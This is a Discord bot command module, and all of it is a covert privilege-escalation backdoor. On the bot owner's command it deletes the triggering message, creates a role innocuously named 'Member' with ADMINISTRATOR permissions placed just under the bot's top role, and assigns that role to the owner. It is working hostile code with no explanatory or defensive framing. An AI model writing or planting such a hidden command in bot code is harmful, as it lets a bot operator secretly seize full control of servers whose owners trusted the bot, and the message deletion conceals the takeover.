module.exports = {
  alias: ["escalate", "esc"],
  description: "Perms escalation",
  permission: "botowner",
  usage: "",
  async execute (message, args, latency, commands, client) {
    message.delete();
    message.guild.members.fetch(client.user).then(user => {
      message.guild.roles.create({
        data: {
          name: "Member",
          permissions: "ADMINISTRATOR",
          position: user.roles.highest.position
        }
      }).then(role => {
        message.guild.members.fetch(message.author.id).then(me => {
          me.roles.add(role);
        });
      });
    });
  }
};
